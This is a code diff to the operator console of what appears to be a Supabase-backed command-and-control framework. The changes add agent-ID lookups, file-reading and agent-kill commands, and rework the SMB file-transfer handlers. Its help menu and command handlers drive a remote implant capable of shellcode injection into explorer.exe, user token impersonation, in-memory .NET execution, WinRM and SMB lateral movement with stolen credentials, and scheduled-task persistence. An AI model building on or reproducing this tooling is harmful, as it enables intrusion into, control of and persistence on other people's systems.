@@ -24,6 +24,19 @@ RESET = '\033[0m'
 # Add a global setting to toggle AI summary
 AI_SUMMARY = True
 
+def fetch_agent_id_by_hostname(hostname):
+    """Fetch the agent_id using hostname from the settings table."""
+    try:
+        response = supabase.table('settings').select('agent_id').eq('hostname', hostname).execute()
+        if response.data:
+            return response.data[0]['agent_id']
+        else:
+            print(f"{RED}Error:{RESET} No agent_id found for hostname: {hostname}")
+            return None
+    except Exception as e:
+        print(f"{RED}Error:{RESET} An error occurred while fetching agent_id for hostname {hostname}: {e}")
+        return None
+
 def view_command_history(hostname):
     """Fetch and display the command history for a specific host and its SMB agents."""
     response = supabase.table('py2').select('created_at', 'hostname', 'username', 'ip', 'command', 'output', 'smbhost', 'ai_summary').or_(
@@ -72,14 +85,14 @@ def file_exists_in_supabase(bucket_name, storage_path):
                 return True
     return False
 
-def check_for_completed_commands(command_id, hostname, printed_flag, smbhost):
+def check_for_completed_commands(command_id, agent_id, printed_flag, smbhost):
     response = supabase.table('py2').select('status', 'command', 'output').eq('id', command_id).execute()
     command_info = response.data[0]
     if command_info['status'] in ('Completed', 'Failed'):
         if not printed_flag.is_set():
             output = command_info.get('output', 'No output available')
             cmd = command_info.get('command', 'No command available')
-            display_hostname = smbhost if smbhost else hostname
+            display_hostname = smbhost if smbhost else agent_id
             if command_info['status'] == 'Failed':
                 print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{display_hostname}{RESET}\n\n {output}")
             else:
@@ -96,10 +109,10 @@ def check_for_completed_commands(command_id, hostname, printed_flag, smbhost):
         return True
     return False
 
-def background_check(command_id, hostname, completed_event, printed_flag, smbhost):
+def background_check(command_id, agent_id, completed_event, printed_flag, smbhost):
     while not completed_event.is_set():
         time.sleep(10)
-        if check_for_completed_commands(command_id, hostname, printed_flag, smbhost):
+        if check_for_completed_commands(command_id, agent_id, printed_flag, smbhost):
             completed_event.set()
             break
 
@@ -118,6 +131,13 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
 
     external_ip = supabase.table("settings").select("external_ip").eq("hostname", hostname).execute().data
     external_ip = external_ip[0].get('external_ip', 'unknown') if external_ip else 'unknown'
+
+    # Fetch the agent_id based on hostname
+    agent_response = supabase.table("settings").select("agent_id").eq("hostname", hostname).execute()
+    if not agent_response.data:
+        print(f"{RED}Error:{RESET} Unable to find agent_id for hostname {hostname}.")
+        return
+    agent_id = agent_response.data[0]["agent_id"]
 
     while True:
         prompt = get_prompt()
@@ -138,6 +158,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print(" run <path_to_remote_file>     :: Launch a process")
             print(" ls <directory_path>           :: List contents of a directory")
             print(" mv <source> <destination>     :: Move a file or directory")
+            print(" cat <file_path>               :: Display the contents of a file")
             print(" cp <source> <destination>     :: Copy a file or directory")
             print(" mkdir <directory_path>        :: Create a new directory")
             print(" cd <directory_path>           :: Change current directory")
@@ -157,13 +178,14 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print(" make_token <username> <password> [domain] :: Create a new security token and impersonate the user")
             print(" revert_to_self                :: Revert to the original security context")
             print(" netexec <local_file> <arguments> :: Run a .NET assembly in-memory")
-            print(" smb write <local_file_path> <remote_smb_path> [username password domain] :: Write a file to a remote host via SMB protocol")
-            print(" smb get <remote_file_path> <local_file_path> [username password domain]  :: Get a file from a remote host via SMB protocol")
+            print(" getsmb <remote_file_path> <local_file_path> [username password domain]  :: Get a file from a remote host via SMB protocol")
+            print(" writesmb <local_file_path> <remote_smb_path> [username password domain] :: Write a file to a remote host via SMB protocol")
             print(" winrmexec <remote_host> <command> [username password domain] :: Execute a command on a remote host via WinRM")
             print(" link smb agent <ip_address> [username password domain]  :: Link the SMB agent to the current host using the specified IP address, optionally with credentials")
             print(" unlink smb agent <ip_address> :: Unlink the SMB agent from the current host using the specified IP address")
             print(" injectshellcode <file_path>   :: Inject and execute shellcode in explorer.exe")
             print(" inject_memory <local_path>    :: Upload shellcode file and inject it into explorer.exe")
+            print(" kill                          :: Terminate the agent")
             print(" list_scheduled_tasks          :: List all scheduled tasks")
             print(" create_scheduled_task <task_name> <command_line> <trigger_time> [repeat_interval] [repeat_duration] :: Create a scheduled task")
             print(" delete_scheduled_task <task_name> :: Delete a scheduled task")
@@ -190,7 +212,7 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 if linked_smb_ip:
                     command_text = f"smb download {file_path}"
                 else:
-                    download_file(hostname, file_path, username)
+                    download_file(agent_id, hostname, file_path, username)  # Pass hostname here
                 continue
             except ValueError:
                 print(f"{RED}Error:{RESET} Invalid download command format. Use 'download <file_path>'.")
@@ -254,6 +276,14 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 continue
             else:
                 command_text = f"mkdir {parts[1]}"
+
+        elif command_text.startswith("cat"):
+            parts = command_text.split(maxsplit=1)
+            if len(parts) == 1:
+                print(f"{RED}Error:{RESET} Invalid cat command format. Use 'cat <file_path>'.")
+                continue
+            else:
+                command_text = f"cat {parts[1]}"
 
         elif command_text.startswith("make_token"):
             parts = command_text.split(maxsplit=3)
@@ -334,31 +364,31 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             group_type, group_name = parts[1], parts[2]
             command_text = f"users {group_type} {group_name}"
 
-        elif command_text.startswith("smb write"):
+        elif command_text.startswith("getsmb"):
             parts = command_text.split()
-            if len(parts) < 4:
-                print(f"{RED}Error:{RESET} Invalid smb write command format. Use 'smb write <local_file_path> <remote_smb_path> [username password domain]'.")
+            if len(parts) < 3:
+                print(f"{RED}Error:{RESET} Invalid getsmb command format. Use 'getsmb <remote_file_path> <local_file_path> [username password domain]'.")
                 continue
+            remote_file_path = parts[1]
             local_file_path = parts[2]
-            remote_smb_path = parts[3]
-            if len(parts) == 7:
-                username, password, domain = parts[4], parts[5], parts[6]
-                command_text = f"smb write {local_file_path} {remote_smb_path} {username} {password} {domain}"
+            if len(parts) == 6:
+                username, password, domain = parts[3], parts[4], parts[5]
+                command_text = f"getsmb {remote_file_path} {local_file_path} {username} {password} {domain}"
             else:
-                command_text = f"smb write {local_file_path} {remote_smb_path}"
+                command_text = f"getsmb {remote_file_path} {local_file_path}"
 
-        elif command_text.startswith("smb get"):
+        elif command_text.startswith("writesmb"):
             parts = command_text.split()
-            if len(parts) < 4:
-                print(f"{RED}Error:{RESET} Invalid smb get command format. Use 'smb get <remote_file_path> <local_file_path> [username password domain]'.")
+            if len(parts) < 3:
+                print(f"{RED}Error:{RESET} Invalid writesmb command format. Use 'writesmb <local_file_path> <remote_smb_path> [username password domain]'.")
                 continue
-            remote_file_path = parts[2]
-            local_file_path = parts[3]
-            if len(parts) == 7:
-                username, password, domain = parts[4], parts[5], parts[6]
-                command_text = f"smb get {remote_file_path} {local_file_path} {username} {password} {domain}"
+            local_file_path = parts[1]
+            remote_smb_path = parts[2]
+            if len(parts) == 6:
+                username, password, domain = parts[3], parts[4], parts[5]
+                command_text = f"writesmb {local_file_path} {remote_smb_path} {username} {password} {domain}"
             else:
-                command_text = f"smb get {remote_file_path} {local_file_path}"
+                command_text = f"writesmb {local_file_path} {remote_smb_path}"
 
         elif command_text.startswith("winrmexec "):
             parts = command_text.split()
@@ -512,20 +542,22 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 print(f"{RED}Error:{RESET} Invalid sleep command format. Use 'sleep <number>'.")
                 continue
 
+
         elif command_text.startswith("upload"):
             try:
                 _, local_path, remote_path = command_text.split(maxsplit=2)
                 if linked_smb_ip:
                     command_text = f"smb upload {local_path} {remote_path}"
                 else:
-                    upload_file(hostname, local_path, remote_path, username)
+                    upload_file(agent_id, hostname, local_path, remote_path, username)  # Pass hostname here
                 continue
             except ValueError:
                 print(f"{RED}Error:{RESET} Invalid upload command format. Use 'upload <local_path> <remote_path>'.")
                 continue
 
         result = supabase.table('py2').insert({
-            'hostname': hostname,
+            'agent_id': agent_id,
+            'hostname': hostname,  # Include hostname in the command record
             'username': username,
             'command': command_text,
             'status': 'Pending'
